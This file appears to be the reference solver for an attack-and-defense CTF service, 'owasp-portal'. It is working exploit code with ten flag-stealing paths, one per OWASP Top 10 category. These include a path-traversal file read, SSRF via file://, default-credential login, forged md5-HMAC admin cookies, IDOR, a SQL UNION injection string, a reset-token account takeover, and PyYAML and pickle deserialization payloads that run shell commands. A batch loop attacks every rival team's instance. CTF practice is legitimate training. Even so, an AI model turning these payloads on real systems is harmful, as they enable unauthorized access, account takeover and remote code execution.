#!/usr/bin/env python3
"""
Reference exploit(s) for owasp-portal.

In Attack & Defense your "solver" runs against OTHER teams' instances each
tick and submits the captured flags via the in-game Toolkit API. `exploit()`
below shows TEN independent flag-leak paths (one per OWASP Top 10 category);
any single one suffices. The A&D submission loop at the bottom is the template
pattern — fill in base/game_id/token from the Toolkit.

    python3 solve.py <ip> <port>        # run all paths against one target
"""
import base64
import hashlib
import hmac
import json
import pickle
import re
import subprocess
import sys

import requests

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def _flag(text):
    m = FLAG_RE.search(text or "")
    return m.group(0) if m else None


def exploit(ip, port):
    """Return {category: flag} for every path that worked against one target."""
    b = f"http://{ip}:{port}"
    out = {}

    # A05 Security Misconfiguration — arbitrary file read (simplest & robust).
    try:
        r = requests.get(f"{b}/debug", params={"file": "/flag"}, timeout=5)
        out["A05"] = _flag(r.text)
    except requests.RequestException:
        pass

    # A10 SSRF — file:///flag.
    try:
        r = requests.get(f"{b}/fetch", params={"url": "file:///flag"}, timeout=5)
        out["A10"] = _flag(r.text)
    except requests.RequestException:
        pass

    # A07 Auth Failures — default creds admin:admin123 -> /admin.
    try:
        s = requests.Session()
        s.post(f"{b}/login", json={"username": "admin", "password": "admin123"}, timeout=5)
        out["A07"] = _flag(s.get(f"{b}/admin", timeout=5).text)
    except requests.RequestException:
        pass

    # A02 Cryptographic Failures — forge a role=admin cookie (md5, secret="secret").
    try:
        p = base64.urlsafe_b64encode(json.dumps({"uid": 1, "username": "x", "role": "admin"}).encode())
        sig = hmac.new(b"secret", p, hashlib.md5).hexdigest()
        cookie = {"session": p.decode() + "." + sig}
        out["A02"] = _flag(requests.get(f"{b}/admin", cookies=cookie, timeout=5).text)
    except requests.RequestException:
        pass

    # A01 Broken Access Control (IDOR) — any logged-in user reads admin note #1.
    try:
        s = requests.Session()
        s.post(f"{b}/register", json={"username": "att", "password": "att"}, timeout=5)
        s.post(f"{b}/login", json={"username": "att", "password": "att"}, timeout=5)
        out["A01"] = _flag(s.get(f"{b}/api/notes/1", timeout=5).text)
        # A03 Injection — UNION-select the flag out of config (reuse the session).
        r = s.get(f"{b}/api/search", params={"q": "' ) UNION SELECT 1,k,v FROM config-- -"}, timeout=5)
        out["A03"] = _flag(r.text)
    except requests.RequestException:
        pass

    # A04 Insecure Design — leaked reset token -> take over admin -> /admin.
    try:
        s = requests.Session()
        tok = s.post(f"{b}/reset", json={"username": "admin"}, timeout=5).json().get("token")
        s.post(f"{b}/reset/confirm", json={"token": tok, "password": "pwned"}, timeout=5)
        s.post(f"{b}/login", json={"username": "admin", "password": "pwned"}, timeout=5)
        out["A04"] = _flag(s.get(f"{b}/admin", timeout=5).text)
    except (requests.RequestException, AttributeError):
        pass

    # A06 Vulnerable Components — old PyYAML full-load RCE.
    try:
        payload = '!!python/object/apply:subprocess.check_output [["cat","/flag"]]'
        r = requests.post(f"{b}/import/yaml", data=payload, timeout=5)
        out["A06"] = _flag(r.text)
    except requests.RequestException:
        pass

    # A08 Integrity Failures — pickle __reduce__ RCE.
    try:
        class E:
            def __reduce__(self):
                return (subprocess.check_output, (["cat", "/flag"],))
        blob = base64.b64encode(pickle.dumps(E())).decode()
        r = requests.post(f"{b}/import/prefs", json={"prefs": blob}, timeout=5)
        out["A08"] = _flag(r.text)
    except requests.RequestException:
        pass

    # A09 Logging Failures — flag logged to a web-served logfile (needs an
    # admin view to have happened; A07 above triggered one).
    try:
        out["A09"] = _flag(requests.get(f"{b}/logs/app.log", timeout=5).text)
    except requests.RequestException:
        pass

    return {k: v for k, v in out.items() if v}


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <ip> <port>", file=sys.stderr)
        sys.exit(2)
    res = exploit(sys.argv[1], int(sys.argv[2]))
    for cat, flag in sorted(res.items()):
        print(f"{cat}: {flag}")
    if not res:
        print("no flag captured", file=sys.stderr)
        sys.exit(1)


# ---------------------------------------------------------------------------
# A&D batch submission (template pattern — fill in from the in-game Toolkit):
#
#   base, game_id, token = "https://ctf...", 1, "<bearer>"
#   targets = requests.get(f"{base}/api/Game/{game_id}/Ad/Targets",
#                          headers={"Authorization": f"Bearer {token}"}).json()
#   flags = []
#   for chal in targets["challenges"]:
#       for team in chal["teams"]:
#           if team.get("ip"):
#               flags += list(exploit(team["ip"], team["port"]).values())
#   requests.post(f"{base}/api/Game/{game_id}/Ad/Submit",
#                 headers={"Authorization": f"Bearer {token}"},
#                 json={"flags": flags})
# ---------------------------------------------------------------------------
